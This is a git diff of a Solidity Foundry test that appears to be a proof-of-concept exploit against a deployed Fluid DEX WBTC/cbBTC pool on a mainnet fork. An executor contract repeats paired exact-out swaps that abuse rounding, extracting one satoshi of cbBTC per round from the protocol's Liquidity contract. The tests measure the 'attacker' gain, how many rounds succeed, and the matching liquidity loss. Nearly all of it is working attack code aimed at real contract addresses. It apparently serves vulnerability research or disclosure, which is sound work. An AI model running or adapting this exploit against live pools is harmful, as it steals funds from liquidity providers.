@@ -27,23 +27,15 @@ contract WbtcCbbtcCycleExecutor {
         require(IERC20BA(cbbtc_).approve(pool_, type(uint256).max), "CBBTC_APPROVE");
     }
 
-    function cycle(uint256 outCbBtc, uint256 rounds)
-        external returns (int256 deltaWbtc, int256 deltaCbBtc, uint256 firstPaidWbtc, uint256 lastPaidCbBtc)
+    function oneRound(uint256 outCbBtc)
+        external returns (uint256 paidWbtc, uint256 paidCbBtc)
     {
-        uint256 beforeWbtc = IERC20BA(wbtc).balanceOf(address(this));
-        uint256 beforeCbBtc = IERC20BA(cbbtc).balanceOf(address(this));
-        for (uint256 i; i < rounds; ++i) {
-            uint256 paidWbtc = IFluidDexExactOut(pool).swapOut(
-                true, outCbBtc, type(uint256).max, address(this)
-            );
-            uint256 paidCbBtc = IFluidDexExactOut(pool).swapOut(
-                false, paidWbtc, type(uint256).max, address(this)
-            );
-            if (i == 0) firstPaidWbtc = paidWbtc;
-            lastPaidCbBtc = paidCbBtc;
-        }
-        deltaWbtc = int256(IERC20BA(wbtc).balanceOf(address(this))) - int256(beforeWbtc);
-        deltaCbBtc = int256(IERC20BA(cbbtc).balanceOf(address(this))) - int256(beforeCbBtc);
+        paidWbtc = IFluidDexExactOut(pool).swapOut(
+            true, outCbBtc, type(uint256).max, address(this)
+        );
+        paidCbBtc = IFluidDexExactOut(pool).swapOut(
+            false, paidWbtc, type(uint256).max, address(this)
+        );
     }
 }
 
@@ -54,12 +46,19 @@ contract ActiveWbtcCbbtcRoundingExtractionTest is Test {
     address constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
     uint256 constant OUT_CBBTC = 101;
 
-    event BitcoinCycleProof(
+    event BitcoinSingleCycleProof(
         uint256 blockNumber,
         uint256 feeRaw,
-        uint256 rounds,
-        uint256 firstPaidWbtc,
-        uint256 lastPaidCbBtc,
+        uint256 paidWbtc,
+        uint256 paidCbBtc,
+        int256 attackerDeltaWbtc,
+        int256 attackerDeltaCbBtc,
+        uint256 liquidityLossCbBtc,
+        uint256 gasUsed
+    );
+    event BitcoinConsecutiveBoundaryProof(
+        uint256 blockNumber,
+        uint256 successfulRounds,
         int256 attackerDeltaWbtc,
         int256 attackerDeltaCbBtc,
         uint256 liquidityLossCbBtc,
@@ -70,45 +69,87 @@ contract ActiveWbtcCbbtcRoundingExtractionTest is Test {
         vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
     }
 
-    function test_deployedWbtcCbBtcCycleAndRepetition() public {
+    function _configuration() internal view returns (uint256 feeRaw) {
         uint256 packed = IFluidDexExactOut(POOL).readFromStorage(bytes32(uint256(1)));
-        uint256 feeRaw = (packed >> 2) & ((1 << 17) - 1);
+        feeRaw = (packed >> 2) & ((1 << 17) - 1);
         assertEq(feeRaw, 45, "unexpected fee");
         assertEq(packed & 3, 3, "both smart pools should be active");
         assertEq(packed >> 255, 0, "pool paused");
+    }
 
-        WbtcCbbtcCycleExecutor executor = new WbtcCbbtcCycleExecutor(POOL, WBTC, CBBTC);
+    function _executor() internal returns (WbtcCbbtcCycleExecutor executor) {
+        executor = new WbtcCbbtcCycleExecutor(POOL, WBTC, CBBTC);
         deal(WBTC, address(executor), 1_000_000);
+    }
 
-        uint256 rounds = 32;
+    function test_deployedSingleCycleExtractsOneSatCbBtc() public {
+        uint256 feeRaw = _configuration();
+        WbtcCbbtcCycleExecutor executor = _executor();
+
+        uint256 attackerWbtcBefore = IERC20BA(WBTC).balanceOf(address(executor));
+        uint256 attackerCbBtcBefore = IERC20BA(CBBTC).balanceOf(address(executor));
         uint256 liquidityWbtcBefore = IERC20BA(WBTC).balanceOf(LIQUIDITY);
         uint256 liquidityCbBtcBefore = IERC20BA(CBBTC).balanceOf(LIQUIDITY);
+
         uint256 gasBefore = gasleft();
-        (int256 deltaWbtc, int256 deltaCbBtc, uint256 firstPaidWbtc, uint256 lastPaidCbBtc) =
-            executor.cycle(OUT_CBBTC, rounds);
+        (uint256 paidWbtc, uint256 paidCbBtc) = executor.oneRound(OUT_CBBTC);
         uint256 gasUsed = gasBefore - gasleft();
+
+        int256 deltaWbtc = int256(IERC20BA(WBTC).balanceOf(address(executor))) - int256(attackerWbtcBefore);
+        int256 deltaCbBtc = int256(IERC20BA(CBBTC).balanceOf(address(executor))) - int256(attackerCbBtcBefore);
         uint256 liquidityWbtcAfter = IERC20BA(WBTC).balanceOf(LIQUIDITY);
         uint256 liquidityCbBtcAfter = IERC20BA(CBBTC).balanceOf(LIQUIDITY);
 
+        assertEq(paidWbtc, 100, "first-leg input");
+        assertEq(paidCbBtc, 100, "second-leg input");
         assertEq(deltaWbtc, 0, "initial WBTC not restored");
-        assertGt(deltaCbBtc, 0, "no cbBTC extracted");
+        assertEq(deltaCbBtc, 1, "expected one sat cbBTC extraction");
         assertEq(liquidityWbtcAfter, liquidityWbtcBefore, "Liquidity WBTC changed");
+        assertEq(liquidityCbBtcBefore - liquidityCbBtcAfter, 1, "Liquidity loss");
+
+        emit BitcoinSingleCycleProof(
+            block.number, feeRaw, paidWbtc, paidCbBtc, deltaWbtc, deltaCbBtc,
+            liquidityCbBtcBefore - liquidityCbBtcAfter, gasUsed
+        );
+    }
+
+    function test_measureConsecutiveSuccessfulCyclesBeforeBoundary() public {
+        _configuration();
+        WbtcCbbtcCycleExecutor executor = _executor();
+
+        uint256 attackerWbtcBefore = IERC20BA(WBTC).balanceOf(address(executor));
+        uint256 attackerCbBtcBefore = IERC20BA(CBBTC).balanceOf(address(executor));
+        uint256 liquidityCbBtcBefore = IERC20BA(CBBTC).balanceOf(LIQUIDITY);
+        uint256 successfulRounds;
+        uint256 gasBefore = gasleft();
+
+        for (uint256 i; i < 64; ++i) {
+            try executor.oneRound(OUT_CBBTC) returns (uint256 paidWbtc, uint256 paidCbBtc) {
+                assertEq(paidWbtc, 100, "unexpected WBTC payment");
+                assertEq(paidCbBtc, 100, "unexpected cbBTC payment");
+                ++successfulRounds;
+            } catch {
+                break;
+            }
+        }
+
+        uint256 gasUsed = gasBefore - gasleft();
+        int256 deltaWbtc = int256(IERC20BA(WBTC).balanceOf(address(executor))) - int256(attackerWbtcBefore);
+        int256 deltaCbBtc = int256(IERC20BA(CBBTC).balanceOf(address(executor))) - int256(attackerCbBtcBefore);
+        uint256 liquidityCbBtcAfter = IERC20BA(CBBTC).balanceOf(LIQUIDITY);
+
+        assertGt(successfulRounds, 0, "no successful cycle");
+        assertEq(deltaWbtc, 0, "initial WBTC not restored");
+        assertEq(deltaCbBtc, int256(successfulRounds), "one sat per successful cycle");
         assertEq(
             liquidityCbBtcBefore - liquidityCbBtcAfter,
-            uint256(deltaCbBtc),
+            successfulRounds,
             "attacker gain != Liquidity loss"
         );
 
-        emit BitcoinCycleProof(
-            block.number,
-            feeRaw,
-            rounds,
-            firstPaidWbtc,
-            lastPaidCbBtc,
-            deltaWbtc,
-            deltaCbBtc,
-            liquidityCbBtcBefore - liquidityCbBtcAfter,
-            gasUsed
+        emit BitcoinConsecutiveBoundaryProof(
+            block.number, successfulRounds, deltaWbtc, deltaCbBtc,
+            liquidityCbBtcBefore - liquidityCbBtcAfter, gasUsed
         );
     }
 }
